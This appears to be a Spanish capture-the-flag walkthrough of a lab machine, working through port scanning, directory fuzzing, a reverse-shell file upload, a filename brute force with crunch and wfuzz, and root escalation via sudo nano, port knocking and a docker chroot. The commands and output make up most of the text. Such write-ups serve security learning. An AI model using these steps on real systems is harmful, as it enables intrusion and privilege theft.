# Enumeracion de Puertos, Servicios y Versiones

nmap -Pn -n -sS -p- -sV --script vuln --min-rate 5000 -vvv -oN nmap 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))


Chequeamos el servicio web y nos conseguimos con la plantilla de apache, revisamos el codigo fuente y no conseguimos nada asi que 
haremos fuzzing web

# fuzzing web

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg 

===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/hackademy            (Status: 301) [Size: 312] [--> http://172.17.0.2/hackademy/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]

chequemos el directorio http://172.17.0.2/hackademy/ y nos conseguimos con que podemos cargar archivos, asi que intentamos cargarnos
un php malicioso que nos envie una shell reverse y al cargarse no arroja el siguiente mensaje

=====================================================================================
El archivo shell.php ha sido subido y alterado xxx_tuarchivo , localizalo y actua.
=====================================================================================

por lo visto una vez cargado nuestro archivo, le cambia el nombre
la estructura seria: xxx_code.php, ahora nos toca averiguar el nombre
completo de nuestro archivo malicioso y para esto nos crearemos una lista
de palabras de 3 caracteres, para esto usaremos: crunch

sintaxis: Crunch <min> <max> <caracteres>

=========================================================================
crunch 3 3 > wordlist.txt

Crunch will now generate the following amount of data: 70304 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 17576 

========================================================================

el minimo y el maximo lo establecemos en 3 ya que son 3 caracteres que no
conocemos, pero esta lista sera desde aaa hasta zzz, vamos ahora hacerlo pero
con numeros tambien

========================================================================
crunch 3 3 1234567890 >> wordlist.txt

Crunch will now generate the following amount of data: 4000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000
========================================================================

con esto creamos una lista que vaya desde 111 hasta 0000 y lo agregamos
a la wordlist.txt que habiamos creado anteriormente pero con letras,
asi que ahora probaremos la wordlist.txt a ver si logramos dar con el nombre
de nuestro archivo php que fue alterado al cargarse en la web, para esto
usaremos wfuzz

wfuzz -w wordlist.txt -u 'http://172.17.0.2/hackademy/FUZZ_code.php' --hc 404

000007062:   200        2 L      14 W       92 Ch       "klp" 

Esto lo que hizo fue probar el diccionario que creamos donde se encuentre >> FUZZ <<
ya que no conociamos el valor de xxx, lo reemplazamos con FUZZ y asi probamos 
nuestro diccionario contra el valor desconocido...

como el codigo php nos envia una shell reverse por el puerto 443, me pongo
en escucha con netcat antes de llamar el archivo klp_code.php


nc -lnvp 443
# whoami
www-data


# Escalada

tratamos la tty

script /dev/null -c bash
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
sudo -l
User www-data may run the following commands on c717225057b1:
    (firsthacking) NOPASSWD: /usr/bin/nano


vemos que podemos usar el binario nano como el usuario firsthacking,
consultamos el binario con searchbins (en nuestra maquina atacante)
o se puede consultar tambien GTFOBINS (el resultado es el mismo)

====================================
searchbins -b nano -f sudo

	| sudo nano
	| ^R^X
	| reset; sh 1>&0 2>&0
====================================

ahora desde la maquina comprometida ejecutamos:

sudo -u firsthacking /usr/bin/nano
Ctrl + r
Ctrl + x

reset; bash 1>&0 2>&0
clear
whoami
firsthacking@c717225057b1:/$

ahora somo el usuario firsthacking

sudo -l
User firsthacking may run the following commands on c717225057b1:
    (ALL) NOPASSWD: /usr/bin/docker

========================================================================================
podemos ejecutar docker como root, asi que volvemos consultar searchbins o GTFOBINS

	| sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash
========================================================================================

sudo /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt bash
docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?.
See 'docker run --help'.

====================================================================
no nos funciona, asi que debemos buscar otra via para poder escalar
asi que ahora revisaremos el sistema a ver que nos conseguimos

al chequear .bashrc nos conseguimos con una funcion docker()

function docker() {
    echo "ï¿½Fijate que hay algo esperando a que llames"
    echo -e "\n 12345 54321 24680 13579 \n"
    echo -e "De nada servira si no llamas antes"
}

parece ser que estamos ante un PORT-KNOCKING, asi que usaremos
12345 54321 24680 13579 y golpearemos esos numeros de puertos a ver 
que sucede, me descargo un script en github para el golpeo de puertos

====================================================================

python3 knockit.py -b 172.17.0.2 12345 54321 24680 13579

golpeamos los pueertos en diferentes configuraciones de forma automatica
y realizamos un escaneo de puertos con nmap a ver si abrio algun puerto, ya
que con esta tecnica logramos abrir puertos ocultos...
tras chequear con nmap, no se abrieron puertos, pero tras revisar los
procesos en ejecucion con htop vemos que en efecto, root estaba ejecutando:

top

50 root      20   0    9748   3588   3204 S   0.0   0.0   0:00.02 knockd                                                                                           

ejecutamos una vez mas el binario de docker

sudo /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt bash

Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
c6a83fedfae6: Pull complete 
Digest: sha256:0a4eaa0eecf5f8c050e5bba433f58c052be7587ee8af3e8b3910ef9ab5fbe9f5
Status: Downloaded newer image for alpine:latest
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@9fac9c7fe69e:/# whoami
#root

=====================================================================
por lo visto, luego de golpear los puertos si pudimos escalar 
privilegios con el binario docker
